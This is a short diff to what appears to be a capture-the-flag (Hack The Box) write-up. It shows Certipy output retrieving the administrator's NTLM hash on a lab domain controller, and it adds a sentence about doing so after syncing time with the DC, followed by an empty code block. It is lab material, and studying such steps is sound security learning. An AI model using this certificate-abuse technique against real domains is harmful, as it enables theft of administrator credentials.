@@ -529,5 +529,9 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
-So after sinking the time 
+So after sinking the time with the DC i can retrieve the NTLM hash of the administrator
+
+```python
+
+```
 
